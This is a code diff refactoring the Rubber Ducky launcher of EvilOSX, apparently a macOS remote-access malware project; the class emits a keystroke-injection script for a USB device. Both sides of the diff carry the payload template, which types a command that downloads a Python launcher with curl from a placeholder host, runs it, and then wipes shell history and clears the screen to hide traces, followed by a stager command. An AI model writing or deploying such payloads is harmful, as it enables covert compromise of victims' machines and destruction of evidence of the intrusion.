@@ -1,16 +1,19 @@
-class Launcher:
-    def __init__(self):
-        self.info = {
+from launchers.helpers import LauncherABC
+
+
+class Launcher(LauncherABC):
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Creates a rubber ducky launcher.",
             "References": [],
         }
 
-    def generate(self, stager):
+    def generate(self, stager: str):
         return ("txt", """\
         REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
         REM Also see https://ducktoolkit.com/vidpid/
-        REM If timing is very important, the following is a lot faster:
+        REM If timing is important, the following is a lot faster:
         REM STRING cd /tmp; curl -s HOST_TO_PYTHON_LAUNCHER.py -o 1337.py; python 1337.py; history -cw; clear
 
         DELAY 1000
@@ -26,6 +29,6 @@ class Launcher:
         ENTER
 
         REM Run the stager
-        STRING %s; history -cw; clear
+        STRING {}; history -cw; clear
         ENTER
-        """ % stager)
+        """.format(stager))
